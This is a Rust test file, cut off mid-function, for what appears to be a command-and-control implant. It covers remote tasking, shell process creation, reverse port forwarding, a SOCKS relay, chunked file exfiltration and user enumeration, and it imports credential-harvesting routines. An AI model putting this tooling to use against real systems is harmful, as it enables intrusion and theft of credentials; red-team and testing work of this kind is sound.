use std::time::Duration;

use std::net::Ipv4Addr;

/// Serialise tests that mutate the `HOME` environment variable.
///
/// `std::env::set_var` is not thread-safe; multiple `#[tokio::test]` test
/// functions run on separate OS threads even though each one uses a
/// single-threaded Tokio executor.  Any test that writes `HOME` must hold
/// this lock for its entire duration to prevent other tests from seeing a
/// stale or foreign home directory.
static HOME_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage,
    DemonProcessCommand, DemonSocketCommand, DemonTransferCommand,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use std::path::Path;

use super::types::SocksClientState;

use super::{
    DownloadTransferState, GroupEntry, HarvestEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
    MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback,
    PhantomState, SessionEntry, UserEntry, collect_browser_passwords,
    collect_git_credential_cache_from, collect_netrc, encode_harvest_entries, execute,
    is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
    parse_memory_region, parse_user_entries,
};
use crate::config::PhantomConfig;
use crate::error::PhantomError;

fn utf16_payload(value: &str) -> Vec<u8> {
    let utf16 = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    let mut payload = Vec::with_capacity(4 + utf16.len());
    payload.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
    payload.extend_from_slice(&utf16);
    payload
}

fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
    let end = *offset + 4;
    let value = u32::from_le_bytes(payload[*offset..end].try_into().expect("u32"));
    *offset = end;
    value
}

fn read_u64(payload: &[u8], offset: &mut usize) -> u64 {
    let end = *offset + 8;
    let value = u64::from_le_bytes(payload[*offset..end].try_into().expect("u64"));
    *offset = end;
    value
}

fn read_bytes<'a>(payload: &'a [u8], offset: &mut usize) -> &'a [u8] {
    let len = read_u32(payload, offset) as usize;
    let end = *offset + len;
    let bytes = &payload[*offset..end];
    *offset = end;
    bytes
}

fn read_utf16(payload: &[u8], offset: &mut usize) -> String {
    let bytes = read_bytes(payload, offset);
    let utf16 = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect::<Vec<_>>();
    String::from_utf16(&utf16).expect("utf16")
}

async fn poll_until<F>(state: &mut PhantomState, mut predicate: F)
where
    F: FnMut(&PhantomState) -> bool,
{
    for _ in 0..100 {
        state.poll().await.expect("poll");
        if predicate(state) {
            return;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }

    panic!("condition not met before poll timeout");
}

async fn poll_n(state: &mut PhantomState, iterations: usize) {
    for _ in 0..iterations {
        state.poll().await.expect("poll");
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

#[tokio::test]
async fn command_no_job_returns_no_callbacks() {
    let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
    let mut state = PhantomState::default();
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    assert!(state.drain_callbacks().is_empty());
}

#[tokio::test]
async fn command_sleep_updates_config_and_queues_callback() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&3000_i32.to_le_bytes());
    payload.extend_from_slice(&25_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandSleep, 7, payload);
    let mut config = PhantomConfig::default();
    let mut state = PhantomState::default();

    execute(&package, &mut config, &mut state).await.expect("execute");

    assert_eq!(config.sleep_delay_ms, 3000, "sleep_delay_ms must be updated");
    assert_eq!(config.sleep_jitter, 25, "sleep_jitter must be updated");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Output { request_id, text }] = callbacks.as_slice() else {
        panic!("expected one Output callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 7);
    assert!(text.contains("3000"), "callback text should mention new delay: {text}");
}

#[tokio::test]
async fn command_sleep_clamps_jitter_to_100() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&1000_i32.to_le_bytes());
    payload.extend_from_slice(&150_i32.to_le_bytes()); // over 100
    let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
    let mut config = PhantomConfig::default();
    let mut state = PhantomState::default();

    execute(&package, &mut config, &mut state).await.expect("execute");

    assert_eq!(config.sleep_delay_ms, 1000);
    assert_eq!(config.sleep_jitter, 100, "jitter exceeding 100 must be clamped");
}

#[tokio::test]
async fn command_sleep_missing_jitter_returns_error() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&2000_i32.to_le_bytes());
    // no jitter field — must not be silently ignored
    let package = DemonPackage::new(DemonCommand::CommandSleep, 2, payload);
    let mut config = PhantomConfig { sleep_jitter: 10, ..PhantomConfig::default() };
    let mut state = PhantomState::default();

    let err =
        execute(&package, &mut config, &mut state).await.expect_err("truncated payload must fail");
    assert!(
        matches!(err, PhantomError::TaskParse("task payload truncated")),
        "expected truncated payload error, got: {err:?}"
    );
    assert_eq!(config.sleep_delay_ms, PhantomConfig::default().sleep_delay_ms);
    assert_eq!(config.sleep_jitter, 10);
}

#[tokio::test]
async fn command_sleep_negative_delay_clamps_to_zero() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(-1_i32).to_le_bytes());
    payload.extend_from_slice(&5_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandSleep, 3, payload);
    let mut config = PhantomConfig::default();
    let mut state = PhantomState::default();

    execute(&package, &mut config, &mut state).await.expect("execute");

    assert_eq!(config.sleep_delay_ms, 0);
    assert_eq!(config.sleep_jitter, 5);
}

#[tokio::test]
async fn get_pwd_queues_structured_fs_callback() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
    assert_eq!(*request_id, 1);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonFilesystemCommand::GetPwd));
    let path = read_utf16(payload, &mut offset);
    assert!(!path.is_empty());
}

#[tokio::test]
async fn proc_create_with_pipe_returns_structured_and_output_callbacks() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
    payload.extend_from_slice(&0_i32.to_le_bytes());
    payload.extend_from_slice(&utf16_payload("/bin/sh"));
    payload.extend_from_slice(&utf16_payload("printf phantom-test"));
    payload.extend_from_slice(&1_i32.to_le_bytes());
    payload.extend_from_slice(&0_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandProc, 2, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [
        PendingCallback::Structured { command_id, request_id, payload },
        PendingCallback::Output { request_id: output_request_id, text },
    ] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
    assert_eq!(*request_id, 2);
    assert_eq!(*output_request_id, 2);
    assert_eq!(text, "phantom-test");

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Create));
    assert_eq!(read_utf16(payload, &mut offset), "/bin/sh");
    assert!(read_u32(payload, &mut offset) > 0);
    assert_eq!(read_u32(payload, &mut offset), 1);
    assert_eq!(read_u32(payload, &mut offset), 1);
    assert_eq!(read_u32(payload, &mut offset), 0);
}

#[tokio::test]
async fn proc_list_returns_structured_process_payload() {
    let package = DemonPackage::new(DemonCommand::CommandProcList, 7, 0_i32.to_le_bytes().to_vec());
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandProcList));
    assert_eq!(*request_id, 7);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), 0);
    assert!(offset < payload.len());
}

#[tokio::test]
async fn net_domain_returns_structured_payload() {
    let package = DemonPackage::new(
        DemonCommand::CommandNet,
        8,
        (DemonNetCommand::Domain as i32).to_le_bytes().to_vec(),
    );
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
    assert_eq!(*request_id, 8);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Domain));
    let _domain = std::str::from_utf8(read_bytes(payload, &mut offset)).expect("utf8");
}

#[tokio::test]
async fn net_users_returns_structured_payload_instead_of_stub_error() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonNetCommand::Users as i32).to_le_bytes());
    payload.extend_from_slice(&utf16_payload("HOST01"));
    let package = DemonPackage::new(DemonCommand::CommandNet, 9, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
    assert_eq!(*request_id, 9);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Users));
    assert_eq!(read_utf16(payload, &mut offset), "HOST01");
    assert!(offset < payload.len(), "expected at least one passwd-backed user");
    let _username = read_utf16(payload, &mut offset);
    let _is_admin = read_u32(payload, &mut offset);
}

#[tokio::test]
async fn net_computer_echoes_target_with_structured_payload() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonNetCommand::Computer as i32).to_le_bytes());
    payload.extend_from_slice(&utf16_payload("CORP.LOCAL"));
    let package = DemonPackage::new(DemonCommand::CommandNet, 10, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandNet));
    assert_eq!(*request_id, 10);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonNetCommand::Computer));
    assert_eq!(read_utf16(payload, &mut offset), "CORP.LOCAL");
}

#[tokio::test]
async fn proc_memory_returns_structured_payload_instead_of_stub_error() {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonProcessCommand::Memory as i32).to_le_bytes());
    payload.extend_from_slice(&0_i32.to_le_bytes());
    payload.extend_from_slice(&0_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandProc, 11, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
    assert_eq!(*request_id, 11);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Memory));
    assert_eq!(read_u32(payload, &mut offset), 0);
    assert_eq!(read_u32(payload, &mut offset), 0);
    assert!(offset < payload.len(), "expected at least one memory region");
    let _base = read_u64(payload, &mut offset);
    let _size = read_u32(payload, &mut offset);
    let _protect = read_u32(payload, &mut offset);
    let _state = read_u32(payload, &mut offset);
    let _type = read_u32(payload, &mut offset);
}

#[tokio::test]
async fn memfile_then_upload_emits_expected_callbacks() {
    let content = b"phantom-upload";

    let mut memfile = Vec::new();
    memfile.extend_from_slice(&77_i32.to_le_bytes());
    memfile.extend_from_slice(&(content.len() as i64).to_le_bytes());
    memfile.extend_from_slice(&(content.len() as i32).to_le_bytes());
    memfile.extend_from_slice(content);

    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("upload.bin");

    let mut upload = Vec::new();
    upload.extend_from_slice(&(DemonFilesystemCommand::Upload as i32).to_le_bytes());
    upload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    upload.extend_from_slice(&77_i32.to_le_bytes());

    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandMemFile, 3, memfile),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("memfile");
    execute(
        &DemonPackage::new(DemonCommand::CommandFs, 4, upload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("upload");

    let callbacks = state.drain_callbacks();
    assert!(matches!(
        callbacks.as_slice(),
        [
            PendingCallback::MemFileAck { request_id: 3, mem_file_id: 77, success: true },
            PendingCallback::FsUpload { request_id: 4, file_size, .. }
        ] if *file_size == content.len() as u32
    ));
    assert_eq!(std::fs::read(path).expect("read back"), content);
}

#[tokio::test]
async fn reverse_port_forward_add_queues_socket_callback() {
    let listener = std::net::TcpListener::bind(("127.0.0.1", 0)).expect("reserve port");
    let port = listener.local_addr().expect("addr").port();
    drop(listener);

    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonSocketCommand::ReversePortForwardAdd as i32).to_le_bytes());
    payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    payload.extend_from_slice(&(i32::from(port)).to_le_bytes());
    payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    payload.extend_from_slice(&8080_i32.to_le_bytes());

    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 5, payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socket");

    assert!(matches!(
        state.drain_callbacks().as_slice(),
        [PendingCallback::Socket { request_id: 5, .. }]
    ));
}

#[tokio::test]
async fn reverse_port_forward_add_local_relays_data() {
    let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
    let target_port = target.local_addr().expect("target addr").port();
    let target_task = tokio::spawn(async move {
        let (mut stream, _) = target.accept().await.expect("accept target");
        let mut buffer = [0_u8; 32];
        let read = stream.read(&mut buffer).await.expect("read target");
        stream.write_all(&buffer[..read]).await.expect("write target");
    });

    // Pass port 0 so the OS assigns an available port atomically, eliminating the
    // TOCTOU race that caused this test to fail non-deterministically under parallel
    // execution (reserve-port-then-drop would let another test grab the port).
    let mut payload = Vec::new();
    payload
        .extend_from_slice(&(DemonSocketCommand::ReversePortForwardAddLocal as i32).to_le_bytes());
    payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    payload.extend_from_slice(&0_i32.to_le_bytes());
    payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    payload.extend_from_slice(&(i32::from(target_port)).to_le_bytes());

    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 6, payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socket");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Socket { request_id: 6, payload }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(
        read_u32(payload, &mut offset),
        u32::from(DemonSocketCommand::ReversePortForwardAddLocal)
    );
    assert_eq!(read_u32(payload, &mut offset), 1);
    // Skip socket_id and bind_addr fields to reach the bound port assigned by the OS.
    let _socket_id = read_u32(payload, &mut offset);
    let _bind_addr = read_u32(payload, &mut offset);
    let bind_port = read_u32(payload, &mut offset) as u16;

    let mut client =
        tokio::net::TcpStream::connect(("127.0.0.1", bind_port)).await.expect("connect listener");
    poll_until(&mut state, |state| !state.local_relays.is_empty()).await;

    client.write_all(b"phantom-rportfwd").await.expect("write client");
    poll_n(&mut state, 10).await;
    let mut echoed = vec![0_u8; "phantom-rportfwd".len()];
    tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
        .await
        .expect("read timeout")
        .expect("read echoed");
    assert_eq!(echoed, b"phantom-rportfwd");

    drop(client);
    poll_until(&mut state, |state| state.local_relays.is_empty()).await;
    target_task.await.expect("target task");
}

#[tokio::test]
async fn socks_proxy_commands_manage_listener_lifecycle() {
    let mut add_payload = Vec::new();
    add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
    add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    add_payload.extend_from_slice(&0_i32.to_le_bytes());

    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 7, add_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socks add");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Socket { request_id: 7, payload }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
    assert_eq!(read_u32(payload, &mut offset), 1);
    let socket_id = read_u32(payload, &mut offset);
    assert_ne!(socket_id, 0);
    assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
    let bound_port = read_u32(payload, &mut offset);
    assert_ne!(bound_port, 0);
    assert_eq!(state.socks_proxies.len(), 1);

    let list_payload = (DemonSocketCommand::SocksProxyList as i32).to_le_bytes().to_vec();
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 8, list_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socks list");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Socket { request_id: 8, payload }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyList));
    assert_eq!(read_u32(payload, &mut offset), socket_id);
    assert_eq!(read_u32(payload, &mut offset), u32::from(Ipv4Addr::LOCALHOST));
    assert_eq!(read_u32(payload, &mut offset), bound_port);

    let mut remove_payload = Vec::new();
    remove_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyRemove as i32).to_le_bytes());
    remove_payload.extend_from_slice(&socket_id.to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 9, remove_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socks remove");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Socket { request_id: 9, payload }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyRemove));
    assert_eq!(read_u32(payload, &mut offset), socket_id);
    assert!(state.socks_proxies.is_empty());

    let mut add_payload = Vec::new();
    add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
    add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    add_payload.extend_from_slice(&0_i32.to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 10, add_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socks add");
    let _ = state.drain_callbacks();

    let clear_payload = (DemonSocketCommand::SocksProxyClear as i32).to_le_bytes().to_vec();
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 11, clear_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socks clear");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Socket { request_id: 11, payload }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyClear));
    assert_eq!(read_u32(payload, &mut offset), 1);
    assert!(state.socks_proxies.is_empty());
}

#[tokio::test]
async fn socks_proxy_relays_connect_and_data() {
    let target = tokio::net::TcpListener::bind(("127.0.0.1", 0)).await.expect("bind target");
    let target_port = target.local_addr().expect("target addr").port();
    let target_task = tokio::spawn(async move {
        let (mut stream, _) = target.accept().await.expect("accept target");
        let mut buffer = [0_u8; 32];
        let read = stream.read(&mut buffer).await.expect("read target");
        stream.write_all(&buffer[..read]).await.expect("write target");
    });

    let mut add_payload = Vec::new();
    add_payload.extend_from_slice(&(DemonSocketCommand::SocksProxyAdd as i32).to_le_bytes());
    add_payload.extend_from_slice(&(u32::from(Ipv4Addr::LOCALHOST) as i32).to_le_bytes());
    add_payload.extend_from_slice(&0_i32.to_le_bytes());

    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandSocket, 12, add_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("socks add");
    let callbacks = state.drain_callbacks();
    let [PendingCallback::Socket { payload, .. }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonSocketCommand::SocksProxyAdd));
    assert_eq!(read_u32(payload, &mut offset), 1);
    let _socket_id = read_u32(payload, &mut offset);
    let _bind_addr = read_u32(payload, &mut offset);
    let proxy_port = read_u32(payload, &mut offset) as u16;

    let mut client =
        tokio::net::TcpStream::connect(("127.0.0.1", proxy_port)).await.expect("connect proxy");
    client.write_all(&[5, 1, 0]).await.expect("write greeting");
    poll_until(&mut state, |state| !state.socks_clients.is_empty()).await;
    let mut greeting = [0_u8; 2];
    tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut greeting))
        .await
        .expect("greeting timeout")
        .expect("read greeting");
    assert_eq!(greeting, [5, 0]);

    client
        .write_all(&[5, 1, 0, 1, 127, 0, 0, 1, (target_port >> 8) as u8, target_port as u8])
        .await
        .expect("write connect");
    poll_until(&mut state, |state| {
        state
            .socks_clients
            .values()
            .any(|client| matches!(client.state, SocksClientState::Relay { .. }))
    })
    .await;

    let mut reply = [0_u8; 10];
    tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut reply))
        .await
        .expect("reply timeout")
        .expect("read reply");
    assert_eq!(reply[0..2], [5, 0]);

    client.write_all(b"phantom-socks").await.expect("write payload");
    poll_n(&mut state, 10).await;
    let mut echoed = vec![0_u8; "phantom-socks".len()];
    tokio::time::timeout(Duration::from_secs(1), client.read_exact(&mut echoed))
        .await
        .expect("echo timeout")
        .expect("read echo");
    assert_eq!(echoed, b"phantom-socks");

    drop(client);
    poll_until(&mut state, |state| state.socks_clients.is_empty()).await;
    target_task.await.expect("target task");
}

#[test]
fn parse_logged_on_users_deduplicates_and_sorts() {
    let users = parse_logged_on_users(
        "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
         bob pts/1 2026-03-23 10:05 (10.0.0.2)\n\
         alice pts/2 2026-03-23 10:10 (10.0.0.3)\n",
    );
    assert_eq!(users, vec!["alice".to_owned(), "bob".to_owned()]);
}

#[test]
fn parse_logged_on_sessions_prefers_remote_host_when_present() {
    let sessions = parse_logged_on_sessions(
        "alice pts/0 2026-03-23 10:00 (10.0.0.1)\n\
         bob pts/1 2026-03-23 10:05\n",
    );
    assert_eq!(
        sessions,
        vec![
            SessionEntry {
                client: "10.0.0.1".to_owned(),
                user: "alice".to_owned(),
                active: 0,
                idle: 0,
            },
            SessionEntry { client: "pts/1".to_owned(), user: "bob".to_owned(), active: 0, idle: 0 },
        ]
    );
}

#[test]
fn parse_user_entries_marks_uid_zero_as_admin() {
    let users = parse_user_entries(
        "root:x:0:0:root:/root:/bin/bash\n\
         daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    );
    assert_eq!(
        users,
        vec![
            UserEntry { name: "daemon".to_owned(), is_admin: false },
            UserEntry { name: "root".to_owned(), is_admin: true },
        ]
    );
}

#[test]
fn parse_group_entries_formats_gid_and_members() {
    let groups = parse_group_entries(
        "root:x:0:\n\
         wheel:x:10:alice,bob\n",
    );
    assert_eq!(
        groups,
        vec![
            GroupEntry { name: "root".to_owned(), description: "gid=0".to_owned() },
            GroupEntry {
                name: "wheel".to_owned(),
                description: "gid=10; members=alice,bob".to_owned(),
            },
        ]
    );
}

#[test]
fn parse_memory_region_maps_linux_permissions_to_windows_compatible_constants() {
    let image = parse_memory_region("00400000-00452000 r-xp 00000000 08:01 12345 /usr/bin/cat")
        .expect("image region");
    assert_eq!(image.base, 0x0040_0000);
    assert_eq!(image.size, 0x52_000);
    assert_eq!(image.protect, PAGE_EXECUTE_READ);
    assert_eq!(image.state, MEM_COMMIT);
    assert_eq!(image.mem_type, MEM_IMAGE);

    let mapped =
        parse_memory_region("7f0000000000-7f0000001000 rw-s 00000000 00:05 99 /dev/shm/demo")
            .expect("mapped region");
    assert_eq!(mapped.protect, super::PAGE_WRITECOPY);
    assert_eq!(mapped.mem_type, MEM_MAPPED);

    let private = parse_memory_region("7ffd5f1c4000-7ffd5f1e5000 rw-p 00000000 00:00 0 [stack]")
        .expect("private region");
    assert_eq!(private.protect, PAGE_READWRITE);
    assert_eq!(private.mem_type, MEM_PRIVATE);

    let writable_exec = parse_memory_region("7f0000002000-7f0000003000 rwxp 00000000 00:00 0")
        .expect("writable exec region");
    assert_eq!(writable_exec.protect, PAGE_EXECUTE_READWRITE);
}

// ── CommandTransfer / chunked download tests ───────────────────────────

#[tokio::test]
async fn fs_download_queues_file_open_and_registers_download() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("download.bin");
    std::fs::write(&path, b"hello download").expect("write test file");

    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
    payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let package = DemonPackage::new(DemonCommand::CommandFs, 42, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::FileOpen { request_id, file_id, file_size, file_path } = &callbacks[0]
    else {
        panic!("expected FileOpen, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 42);
    assert_eq!(*file_size, 14);
    assert!(!file_path.is_empty());
    let _ = *file_id; // random value, just ensure the field exists

    assert_eq!(state.downloads.len(), 1);
    assert_eq!(state.downloads[0].total_size, 14);
    assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
}

#[tokio::test]
async fn push_download_chunks_sends_data_and_close() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("chunked.bin");
    let data = vec![0xAB_u8; 100];
    std::fs::write(&path, &data).expect("write test file");

    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
    payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let package = DemonPackage::new(DemonCommand::CommandFs, 50, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
    state.drain_callbacks(); // drain the FileOpen

    // Poll to push chunks.
    state.push_download_chunks();
    let callbacks = state.drain_callbacks();

    // With 100 bytes and a 512 KiB chunk size, should get one chunk + close.
    assert_eq!(callbacks.len(), 2);

    let PendingCallback::FileChunk { data: chunk, .. } = &callbacks[0] else {
        panic!("expected FileChunk, got: {:?}", callbacks[0]);
    };
    assert_eq!(chunk.len(), 100);
    assert!(chunk.iter().all(|b| *b == 0xAB));

    assert!(matches!(&callbacks[1], PendingCallback::FileClose { .. }));
    assert!(state.downloads.is_empty());
}

#[tokio::test]
async fn file_open_callback_encodes_beacon_output_command_id() {
    let callback = PendingCallback::FileOpen {
        request_id: 1,
        file_id: 0x1234,
        file_size: 4096,
        file_path: "/tmp/test.bin".to_owned(),
    };
    assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

    let payload = callback.payload().expect("payload");
    let mut offset = 0;
    assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::File));
    let inner_len = read_u32(&payload, &mut offset) as usize;
    assert_eq!(inner_len, 4 + 4 + "/tmp/test.bin".len());
    assert_eq!(read_u32(&payload, &mut offset), 0x1234);
    assert_eq!(read_u32(&payload, &mut offset), 4096);
    let path_bytes = &payload[offset..];
    assert_eq!(path_bytes, b"/tmp/test.bin");
}

#[tokio::test]
async fn file_chunk_callback_encodes_correctly() {
    let callback =
        PendingCallback::FileChunk { request_id: 2, file_id: 0xDEAD, data: vec![1, 2, 3, 4] };
    assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

    let payload = callback.payload().expect("payload");
    let mut offset = 0;
    assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileWrite));
    let inner_len = read_u32(&payload, &mut offset) as usize;
    assert_eq!(inner_len, 4 + 4); // file_id + data
    assert_eq!(read_u32(&payload, &mut offset), 0xDEAD);
    assert_eq!(&payload[offset..], &[1, 2, 3, 4]);
}

#[tokio::test]
async fn file_close_callback_encodes_correctly() {
    let callback = PendingCallback::FileClose { request_id: 3, file_id: 0xBEEF };
